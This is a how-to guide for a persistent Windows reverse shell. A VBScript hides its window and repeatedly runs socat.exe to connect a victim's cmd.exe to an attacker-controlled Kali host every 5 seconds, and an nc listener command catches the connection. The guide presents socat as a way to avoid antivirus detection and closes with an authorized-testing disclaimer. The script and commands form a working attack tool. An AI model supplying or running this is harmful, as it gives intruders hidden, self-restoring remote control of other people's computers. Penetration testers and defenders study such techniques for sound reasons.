# Reverse Shell Using Socat and VBScript

This guide demonstrates how to use **Socat** along with a **VBScript** to establish a reverse shell. The script will ensure that the reverse shell connection is automatically re-established every 5 seconds if it gets disconnected. This method is effective because **Socat** is less likely to be detected by most antivirus software compared to other reverse shell tools.

---

## Prerequisites

- **Socat**: A utility that establishes bidirectional communication between two data streams. It's used to create the reverse shell.
- **VBScript**: A script to monitor and reconnect the reverse shell every 5 seconds.
- **Windows Victim Machine**: The machine you are targeting needs to have **Socat.exe** and the VBScript.
- **Kali Linux Attacker Machine**: Should have a listener running to accept the reverse shell connection.

---

## Workflow

### Step 1: Download Required Files on the Attacker Machine

1. **Download the necessary DLL files and `socat.exe`** for the reverse shell.

   On your **Kali Linux** machine, download the required **Socat executable** and any associated **DLL files**.

2. **Copy the files** to your **Windows victim machine**.

---

### Step 2: Create the VBScript for Reconnection

3. On the **Windows victim machine**, create a file named `reconnect.vbs` in the same directory where `socat.exe` and the DLL files are located. Open Notepad and paste the following code:

```vbscript
Set objShell = CreateObject("wscript.Shell")

Do
    ' Replace <Kali-IP> with the attacker's IP address and <Port> with the desired port number
    objShell.Run "cmd.exe /c socat.exe TCP:<Kali-IP>:<Port> EXEC:cmd.exe,pipes", 0, True
    WScript.Sleep 5000 ' Wait for 5 seconds before retrying
Loop
```

4. **Save** the file as `reconnect.vbs`.

   - Replace `<Kali-IP>` with your **Kali Linux machine's IP address**.
   - Replace `<Port>` with the port you want to use for the reverse shell (e.g., `4444`).

### Step 3: Setup Listener on the Kali Linux Machine

5. On your **Kali Linux** machine, set up a listener using **Netcat** (or **Socat**):

```bash
nc -lvnp <Port>
```

Replace `<Port>` with the port you specified in the VBScript. This listener will accept the reverse shell connection from the victim machine.

---

### Step 4: Execute the Reverse Shell

6. On the **Windows victim machine**, simply **double-click** on the `reconnect.vbs` file to run the script. The script will:

   - Execute the `socat.exe` reverse shell, connecting back to your Kali machine on the specified port.
   - If the connection fails or is lost, the script will automatically retry the connection every 5 seconds.

---

### Step 5: Interaction with the Victim's Shell

7. Once the connection is established, you will have a **remote shell** on the victim machine through the **Kali listener**. You can interact with the victim's **command prompt**.

### Legal Disclaimer

This reverse shell guide is intended for **ethical hacking** and **authorized penetration testing** only. Unauthorized access to computer systems is illegal and unethical. Always get explicit written permission before conducting any tests or activities that may impact a network or system.
